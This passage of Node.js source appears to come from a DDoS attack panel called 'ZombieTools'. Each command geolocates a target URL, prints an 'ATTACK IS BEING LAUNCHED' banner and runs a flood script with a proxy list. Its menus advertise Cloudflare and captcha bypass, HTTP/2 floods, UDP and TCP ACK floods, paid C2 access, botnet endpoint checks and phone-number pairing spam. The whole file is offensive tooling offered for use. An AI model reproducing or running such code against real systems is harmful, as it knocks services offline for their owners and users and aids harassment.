 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];


    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]);
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/6`);
    await pushMonitor(target, 'h2-blast', duration); 
    exec(`node ${metode} ${target} ${duration} 34 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function cloudflare(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: CLOUDFLARE <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} cloudflare ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

  
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/7`);
    await pushMonitor(target, 'cloudflare', duration); 
    exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function quantum(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: QUANTUM <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} quantum ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

 
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/8`);
    await pushMonitor(target, 'quantum', duration);
    exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function h2fast(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: H2-FAST <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} h2-fast ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

  
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/9`);
    await pushMonitor(target, 'h2-fast', duration);
    exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function h2storm(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: H2-STORM <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} h2-storm ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

    
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/10`);
    await pushMonitor(target, 'h2-storm', duration); 
    exec(`node ${metode} ${target} ${duration} 37 3 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function api(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: API <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} api ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

    
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/11`);
    await pushMonitor(target, 'api', duration); 
    exec(`node ${metode} GET ${target} ${duration} 32 3 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function bypass(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: BYPASS <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} bypass ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

   
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/12`);
    await pushMonitor(target, 'bypass', duration); 
    exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function h2raw(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: H2-RAW <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} h2-raw ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

   
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/14`);
    await pushMonitor(target, 'h2-raw', duration); 
    exec(`node ${metode} ${target} ${duration}`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}
// [========================================] /

async function sigma() {

  const gradientWithBold = (text) => {
  const gradiatedText = gradient(['red', 'pink', 'blue'])(text); 
  return `${bold}${gradiatedText}${Reset}`; 
};

permen.question(gradientWithBold(`┌─[${usernameInput}@root] - [/ZombieTools/]\n└──➤ `), (input) => {
    const [command, ...args] = input.trim().split(/\s+/);
 
  if (command === 'help') {
    const text = `  ${bold}NAME${Reset}            │ ${bold}ALIAS${Reset}         │ ${bold}DESCRIPTION${Reset}
________________│_______________│________________________________
 methods        │ ----          │ Show list of available method
 monitor        │ ----          │ Show monitor attack
 monitorsrv     │ ----          │ Show server attack 
 clr            │ c             │ Clear terminal 
 showmt         │ show          │ Show list method in server
 pair           │ ----          │ Spam pair to number
 test           │ ----          │ Check your server
 exit           │ ----          │ Exit from tools 
`;
    const lines = text.trim().split('\n'); 
    let i = 0;
    const interval = setInterval(() => {
        console.log(lines[i]); 
        i++;
        if (i >= lines.length) {
            clearInterval(interval); 
            setTimeout(() => {
                sigma(); 
            }, 70);
        }
    }, 60); 
  
  } else if (command === 'methods') {
    const text = `
${bold} ${ungu}►${Reset}${bold}                   L A Y E R 7 ${Reset}          
${bold} METHODS             DESCRIPTION   ${Reset}                  
 ninja          ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [For test]           
 tls            ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Secure connection]   
 bypass         ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Bypasser]       
 quantum        ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Bypasser flood]
 api            ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Http/2 RESTful API's]    
 cloudflare     ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Bypass cloudflare]   
 h2-storm       ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Http/2 overload traffic]    
 h2-fast        ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Http/2 heavy traffic] 
 h2-raw         ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Secure connection] 
 h2-blast       ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Http/2 abnormal traffic]   
 h2-gecko [${merah}VIP${Reset}] ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Best Bypasser]
 xyn [${merah}VIP${Reset}]      ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [Best Methods]   
 glory [${merah}VIP${Reset}]    ${teksmerah}${bold}➠${Reset}    Layer 7 Attack Url [high request per/s]
${bold} - note usage : ${cyan}<methods> <host> <port> <duration> 
`;
    const lines = text.trim().split('\n'); 
    let i = 0;
    const interval = setInterval(() => {
    console.log(lines[i]); 
    i++;
    if (i >= lines.length) {
        clearInterval(interval); 
        setTimeout(() => {
            sigma(); 
        }, 70);
    }
   }, 60); 
 
  } else if (command === 'show' || command === 'showmt') {
    const text = `
 ${merah}     note : buy c2 access to use the method below ${Reset}
${bold} METHODS             DESCRIPTION               
                       Command${Reset}
 httpx          ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Secure Connection]
 flood          ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Flood Request] 
 xyn            ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Best Flooding]   
 tls            ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Secure Connection]            
 hold           ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Hold Web]   
 gecko          ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Gecko Bypass]       
 browser        ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Best Bypasser For Captcha]     
 rapid          ${teksmerah}${bold}➠${Reset}    Layer 7 [Normal] Attack Url [Secure Connection]   
 udp            ${teksmerah}${bold}➠${Reset}    Layer 4 [Normal] Attack Ip [Udp Flood]         
 tcp            ${teksmerah}${bold}➠${Reset}    Layer 4 [Normal] Attack Ip [Tcp ACK Flood]   
`;
    const lines = text.trim().split('\n'); 
    let i = 0;

    const interval = setInterval(() => {
        console.log(lines[i]);
        i++;
        if (i >= lines.length) {
            clearInterval(interval);
            setTimeout(() => {
                sigma(); 
            }, 70);
        }
    }, 60); 
    
  } else if (command === 'spam-pair' || command === 'pair') {
    spamPair(args);
  } else if (command === 'ninja' || command === 'NINJA') {
    ninja(args);
  } else if (command === 'xyn' || command === 'XYN') {
    xyn(args);
  } else if (command === 'api' || command === 'API') {
    api(args);
  } else if (command === 'h2-storm' || command === 'H2-STORM') {
    h2storm(args);
  } else if (command === 'tls' || command === 'TLS') {
    tls(args);
  } else if (command === 'h2-blast' || command === 'H2-BLAST') {
    h2blast(args);
  } else if (command === 'h2-fast' || command === 'H2-fast') {
    h2fast(args);
  } else if (command === 'bypass' || command === 'BYPASS') {
    bypass(args);
  } else if (command === 'h2-gecko' || command === 'H2-GECKO') {
    h2gecko(args);
  } else if (command === 'glory' || command === 'GLORY') {
    glory(args);
  } else if (command === 'cloudflare' || command === 'CLOUDFLARE') {
    cloudflare(args);
  } else if (command === 'quantum' || command === 'QUANTUM') {
    quantum(args);
  } else if (command === 'h2-raw' || command === 'H2-RAW') {
    h2raw(args);
  } else if (command === 'passwd') {
    changePassword()
  } else if (command === 'monitorsrv') {
    monitorOngoingAttacks();
  } else if (command === 'test') {
    TestBotnetEndpoints();
  } else if (command === 'monitor') {
    monitorAttack();
  } else if (command === 'exit') {
    exitScript();
  } else if (command === 'clr' || command === 'c') {
    banner().then(() => {
        setTimeout(() => {
            sigma();
        } ,70);
    });
    } else {
    console.log(`${teksmerah}${bold}[ System ] ${Reset}${command} Not found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()